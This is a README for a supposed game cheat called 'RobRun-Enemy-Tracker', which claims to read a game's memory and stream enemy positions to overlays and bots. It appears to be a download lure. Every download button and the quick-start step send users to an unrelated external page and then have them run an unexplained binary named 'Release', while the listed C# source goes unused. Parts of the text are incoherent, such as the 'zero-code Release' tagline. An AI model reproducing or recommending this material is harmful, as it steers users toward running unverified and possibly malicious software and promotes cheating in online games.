# RobRun‑Enemy‑Tracker  
*Real‑time enemy detection for RobRun – fully configurable, zero‑code Release.*

[![Version](https://img.shields.io/badge/version-1.0.0‑blue.svg)](#) 
[![License](https://img.shields.io/badge/license-MIT‑green.svg)](LICENSE) 
[![Platform](https://img.shields.io/badge/platform‑Windows%20|%20Linux‑lightgrey.svg)](#) 
[![Stars](https://img.shields.io/github/stars/gigahokagepincers/RobRun-Enemy-Tracker?style=flat)](https://github.com/gigahokagepincers/RobRun-Enemy-Tracker/stargazers)  

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/GET‑STARTED‑orange?style=for-the-badge&logo=github" alt="Get Started">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/DOWNLOAD‑NOW‑purple?style=for-the-badge&logo=download" alt="Download Now">
  </a>
</div>

---

## 🎯 What Is This?

RobRun‑Enemy‑Tracker is a lightweight utility that watches the **RobRun** game process, extracts live enemy coordinates, and feeds them to any downstream utility (e.g., overlay scripts, AI bots, analytics).  
All behaviour is driven by **human‑readable configuration files**, so you never have to touch code again.

### Core Benefits
| ✅ | Feature |
|---|---|
| **Zero‑code presets** | Drop a `.json` file, reload, and you’re good to go. |
| **Live reloading** | Changes to config are applied instantly without restarting. |
| **Multi‑profile support** | Keep separate presets for “solo”, “team”, “hard‑mode”, etc. |
| **Extensible output** | Choose CSV, JSON, or a simple TCP stream. |
| **Cross‑platform** | Works on Windows 10+ and modern Linux distros. |

---

## 📁 Repository Layout

```
RobRun-Enemy-Tracker/
├─ src/                     # Core C# source files
├─ presets/                 # Example configuration bundles
│   ├─ solo.json
│   ├─ team.json
│   └─ hardcore.json
├─ docs/                    # Detailed user guide & API reference
├─ scripts/                 # Helper PowerShell / Bash wrappers
└─ README.md                # You’re reading it right now
```

---

## 🚀 Quick Start

1. **Grab the latest build** – click the **GET STARTED** button above.  
2. Unzip the package to a folder of your choice.  
3. Pick a preset from `presets/` or create your own (see below).  
4. Run `Release` (or the Linux binary) – the tracker will auto‑detect the running RobRun process.  
5. Open your favourite visualizer and point it at the output file/port you configured.

> **Tip:** Keep the console window open; it shows real‑time stats and any parsing errors.

---

## 🛠️ Creating & Editing Presets

Presets are simple JSON files. The schema is deliberately flat:

```json
{
  "output": {
    "type": "csv",               // "csv" | "json" | "tcp"
    "path": "logs/enemies.csv",  // for file outputs
    "host": "127.0.0.1",         // for tcp
    "port": 4242
  },
  "filters": {
    "minHealth": 0,
    "maxDistance": 150
  },
  "capture": {
    "frequencyHz": 30,
    "includeTeamMates": false
  }
}
```

* **`output.type`** – decides the serialization format.  
* **`filters`** – prune unwanted entries before they hit disk/network.  
* **`capture.frequencyHz`** – how often the tracker polls the game memory.

Save the file in the `presets/` folder and launch the tracker with `--preset solo.json`.

---

## 📡 Integration Samples

### 1️⃣ Feed into a Live Overlay (CSV)

```bash
Release --preset presets/solo.json
```

Your overlay can read `logs/enemies.csv` and refresh the UI each line.

### 2️⃣ Stream to a Python Bot (TCP)

```bash
Release --preset presets/team.json
```

```python
import socket, json

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 4242))

while True:
    line = sock.recv(4096).decode()
    data = json.loads(line)
    # do something with enemy coordinates
```

---

## 🧩 Advanced Customisation

| Area | How to Extend |
|------|---------------|
| **New output format** | Implement `IOutputProvider` in `src/Outputs/` and register it in `Program.cs`. |
| **Additional filters** | Add a function under `src/Filters/` and expose it via the JSON schema. |
| **Platform‑specific tweaks** | Use the `#if WINDOWS` / `#if LINUX` pre‑processor blocks already present in the source. |

Pull requests that add a fresh output plugin are especially welcome!

---

## 📜 License & Contributions

- **License:** MIT – see the `LICENSE` file.  
- **Contributions:** Fork → branch → PR. Please keep the JSON schema backward‑compatible.  

---

## 📞 Support & Community

- **Issues:** Open a GitHub Issue for bugs or feature ideas.  
- **Discussions:** Join the **RobRun‑Enemy‑Tracker** discussion board for tips, preset sharing, and troubleshooting.  

Happy hunting! 🎮